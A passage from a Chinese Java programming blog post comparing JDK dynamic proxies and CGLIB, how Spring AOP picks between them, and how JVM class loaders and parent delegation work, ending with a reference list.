动态代理一样都能拦截方法调用，替被拦截方法做一些它做不到的事情。\n完整代码已发布，请参考 proxy。\n综上所述，JDK 动态代理只能通过接口生成代理类，代理类与被代理类是兄弟姐妹，而 CGLIB 还能通过基类生成代理类，代理类是被代理类的子类。 除了能力上的区别，在性能上，似乎普遍认为 CGLIB 要快于 JDK 动态代理。前文提到了 Spring AOP 使用 JDK 动态代理或 CGLIB 在运行时生成代理类，那么 Spring AOP 在什么情况下采用 JDK 动态代理？又是在什么情况下次采用 CGLIB？如结论所说，如果被代理类或目标类实现了一个或多个接口，那么 Spring AOP 将采用 JDK 动态代理生成一个实现每个接口的代理类；如果被代理类或目标类没有实现接口，那么 Spring AOP 将采用 CGLIB 动态生成代理类，它是被代理类或目标类的子类。当然，Spring AOP 很可能也允许我们强制采用其中一种方式。\n虽然动态生成了代理类，但是如果不把代理类加载到 JVM 方法区，也就不能创建它的实例。回头看一下 JDK 动态代理的 newProxyInstance 方法的首要参数：\n1  loader – the class loader to define the proxy class   它是一个用于定义代理类的类加载器，我们传递了被代理类的类加载器，因而被代理类和代理类的类加载器是相同的。\n1 2  target class loader: sun.misc.Launcher$AppClassLoader@18b4aac2 proxy class loader: sun.misc.Launcher$AppClassLoader@18b4aac2   AppClassLoader 是应用程序类加载器，又名为系统类加载器（System Class Loader），它所在的家族大概长这样子：\n其中没有双亲的 Bootstrap Class Loader 从 JRE/lib/rt.jar 加载类，它的孩子 Extension Class Loader 从 JRE/lib/ext 或 java.ext.dirs 加载类，它的子孙 System Class Loader 从 CLASSPATH、-classpath、-cp、Mainfest 加载类。类加载机制使用 Parent Delegation Model 处理类加载请求，自底向上检查类是否已加载，自顶向下尝试加载类。当然，如果有需要自定义类加载器，则需要编写类直接或间接继承 java.lang.ClassLoader 并重写相应的方法（一般会继承 java.net.URLClassLoader）。\n后记 在 Spring AOP 的使用过程中，还发现一个叫做 AspectJ 的家伙；在编译时和运行时之间是编译后和加载时，它就在加载时做手脚\u0026hellip;\u0026hellip;\n 本文首发于 https://h2cone.github.io\n 参考   冒号课堂§3.3：切面范式\n  Aspect Oriented Programming with Spring\n  JDK- and CGLIB-based proxies\n  Spring本质系列(2)-AOP\n  Dynamic Proxy Classes\n  Java帝国之动态代理\n  从兄弟到父子：动态代理在民间是怎么玩的？\n  CGLIB 仓库\n  ASM： 一个低调成功者的自述\n  ASM 官网\n  classloader-in-java\n  Class ClassLoader\n  Java运行时动态生成class的方法\n  Load-time Weaving with AspectJ in the Spring Framework\n  ","date":"2019-09-17T11:29:21+08:00","permalink":"https://h2cone.github.io/2019/09/17/aop_proxy_bytecode/","title":"切面和动态代理以及字节码"}]